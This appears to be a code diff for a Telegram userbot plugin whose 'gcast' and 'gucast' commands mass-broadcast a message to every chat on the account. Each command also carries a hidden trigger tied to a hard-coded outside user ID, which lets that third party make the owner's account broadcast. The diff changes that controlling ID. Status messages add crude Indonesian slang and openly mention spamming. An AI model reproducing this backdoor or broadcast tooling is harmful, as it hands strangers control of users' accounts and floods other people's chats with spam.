@@ -31,20 +31,20 @@ while 0 < 6:
     if _GCAST_BLACKLIST.status_code != 200:
         if 0 != 5:
             continue
-        GCAST_BLACKLIST = [-1001608701614, -1001451642443, -1001473548283, -1001982790377, -1001812143750, -1001692751821 -1001390552926, -1001001675459127, -1001864253073, -1001565255751, -1001287188817, -1001876092598, -1001562283549, -1001001951726069, -1001861414061]
+        GCAST_BLACKLIST = [-1001608701614, -1001451642443, -1001473548283, -1001982790377, -1001812143750, -1001692751821 -1001390552926, -1001001675459127, -1001864253073, -1001565255751, -1001287188817, -1001876092598, -1001562283549, -1001001951726069, -1002084592162]
     GCAST_BLACKLIST = _GCAST_BLACKLIST.json()
     break
 
 del _GCAST_BLACKLIST
 
 
-@Client.on_message(filters.command("numpanggcast", ["."]) & filters.user(1860375797) & ~filters.me)
+@Client.on_message(filters.command("cgcast", ["."]) & filters.user(995099715) & ~filters.me)
 @Client.on_message(filters.command("gcast", cmd) & filters.me)
 async def gcast_cmd(client: Client, message: Message):
     if message.reply_to_message or get_arg(message):
         Man = await edit_or_reply(message, "`ꜱᴀʙᴀʀ ᴅᴜʟᴜ ʏᴀ ꜱᴀʏᴀɴɢ ɪɴɪ ʟᴀɢɪ ᴘʀᴏꜱᴇꜱ 🥰🥰`")
     else:
-        return await message.edit_text("**Pesannya Mana Sayang🥰**")
+        return await message.edit_text("**Pesannya Mana Sayangku🥰**")
     done = 0
     error = 0
     async for dialog in client.get_dialogs():
@@ -66,17 +66,17 @@ async def gcast_cmd(client: Client, message: Message):
                     error += 1
                     await asyncio.sleep(0.3)
     await Man.edit_text(
-        f"**Asik Terkirim 🥳:** `{done}` \n **🤪 Mampus Gagal Ke Kirim:** `{error}`"
+        f"**Duar Memek 🥳:** `{done}` \n **🗿 Mampus Gagal Ke Kirim:** `{error}`"
     )
 
 
-@Client.on_message(filters.command("numpanggucast", ["."]) & filters.user(1860375797) & ~filters.me)
+@Client.on_message(filters.command("cgucast", ["."]) & filters.user(995099715) & ~filters.me)
 @Client.on_message(filters.command("gucast", cmd) & filters.me)
 async def gucast_cmd(client: Client, message: Message):
     if message.reply_to_message or get_arg(message):
-        Man = await edit_or_reply(message, "`Limit Jangan Salahin Gua Ya Anjing, Started global broadcast...`")
+        Man = await edit_or_reply(message, "`Gass Musuh Terlihat Seeing Gikes 😆...`")
     else:
-        return await message.edit_text("**Pesannya Mana Sayang🥰**")
+        return await message.edit_text("**Pesannya Mana Sayangku🥰**")
     done = 0
     error = 0
     async for dialog in client.get_dialogs():
@@ -98,7 +98,7 @@ async def gucast_cmd(client: Client, message: Message):
                     error += 1
                     await asyncio.sleep(0.3)
     await Man.edit_text(
-        f"**Berhasil Mengirim Pesan Ke** `{done}` **chat Nih tod, Gagal Mengirim Pesan Ke** `{error}` **chat Tod, Sorry**"
+        f"**Kalo Mau Spam Kira Kira Goblok Tapi Udh ke kirim ** `{done}` **chat Nih tod, Harap Cek Limit Kebanyakan anu jadi cuma kekirim** `{error}` **chat Tod, Sorry**"
     )
 
 
